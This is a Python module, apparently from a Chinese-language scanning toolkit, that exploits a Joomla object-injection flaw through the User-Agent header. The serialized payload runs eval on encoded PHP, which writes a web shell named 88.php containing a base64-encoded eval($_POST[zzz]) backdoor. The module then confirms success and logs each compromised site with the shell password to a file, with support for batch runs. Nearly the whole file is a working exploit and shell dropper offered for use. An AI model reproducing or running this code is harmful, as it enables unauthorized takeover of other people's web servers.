#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet

urllib3.disable_warnings()


class JoomlaGetshellScan:
    def get_url(self, url, user_agent):
        headers = {
            'User-Agent': user_agent
        }
        cookies = requests.get(url, headers=headers, proxies=self.proxy, verify=self.ssl, timeout=self.timeout).cookies
        for _ in range(3):
            requests.get(url, headers=headers, cookies=cookies, proxies=self.proxy, verify=self.ssl,
                         timeout=self.timeout)

    def php_str_noquotes(self, data):
        # "Convert string to chr(xx).chr(xx) for use in php"
        encoded = ""
        for char in data:
            encoded += "chr({0}).".format(ord(char))

        return encoded[:-1]

    def generate_payload(self, php_payload):
        php_payload = "eval({0})".format(self.php_str_noquotes(php_payload))

        terminate = '\xf0\xfd\xfd\xfd'
        exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
        injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
        exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
        exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

        return exploit_template

    def check(self, url):
        response = requests.get(url, headers=self.headers, proxies=self.proxy, verify=self.ssl, timeout=self.timeout)
        response.encoding = response.apparent_encoding
        return response.text

    def main(self, target):
        self.batch = target["batch_work"]
        turl = target["url"].strip("/ ")
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Joomla", "开始检测Joomla漏洞...")
        syscmd = "file_put_contents(dirname($_SERVER['SCRIPT_FILENAME']).'/88.php',base64_decode('dnZ2PD9waHAgZXZhbCgkX1BPU1Rbenp6XSk7Pz4='));"
        pl = self.generate_payload(syscmd)
        self.get_url(turl, pl)
        url = turl + '/88.php'
        # print(url)
        if 'vvv' in self.check(url):
            OutPrintInfoSuc("Joomla", f"成功shell为{turl}/88.php | 密码为zzz")
            if self.batch:
                with open("./result/joomla_get_shell.txt","a") as w:
                    w.write(f"{turl}/88.php | 密码为zzz\n")

        else:
            if not self.batch:
                OutPrintInfo("Joomla", "失败！漏洞已修补或版本不同！")
        if not self.batch:
            OutPrintInfo("Joomla", "漏洞检测结束")